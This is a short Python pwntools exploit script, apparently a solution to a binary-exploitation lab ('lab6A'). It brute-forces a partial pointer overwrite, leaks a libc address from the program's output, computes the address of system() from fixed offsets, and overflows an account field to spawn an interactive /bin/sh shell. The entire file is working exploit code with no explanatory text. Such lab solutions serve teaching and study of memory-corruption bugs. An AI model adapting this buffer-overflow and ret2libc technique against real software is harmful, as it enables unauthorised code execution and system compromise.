from pwn import *

def setup_account(u, d, p):
    p.sendline("1")
    p.recvuntil("Enter your name: ")
    p.sendline(u)
    p.recvuntil("Enter your description: ")
    p.sendline(d)
    p.recvuntil("Choice: ")
    p.sendline("3")

while True:

    p = process("./lab6A")
    u = "A"*31
    d = "X"*90+"\xe2\x0b\x00"
    p.recvuntil("Choice: ")
    setup_account(u,d,p)
    try:
        ret = p.recv(400)
        if ("Username: " in ret): break
    except EOFError:
        continue
log.info("Partial overwrite succeeded!")

#print hexdump(ret)
setup_account("u","d",p)
ret = p.recv(400)
addr_leak = (ord(ret[0xba])) + (ord(ret[0xbb])<<8)+(ord(ret[0xbc])<<16)+(ord(ret[0xbd])<<24)
log.info("libc_leak: " + hex(addr_leak))
libc_base = addr_leak - 0x19a83
log.success("libc_base: " + hex(libc_base))
addr_system = libc_base + 0x40190

#call system("bin/sh"))
setup_account("/"*19+"/bin/sh\x00","X"*96+p32(addr_system),p)
p.interactive()
        
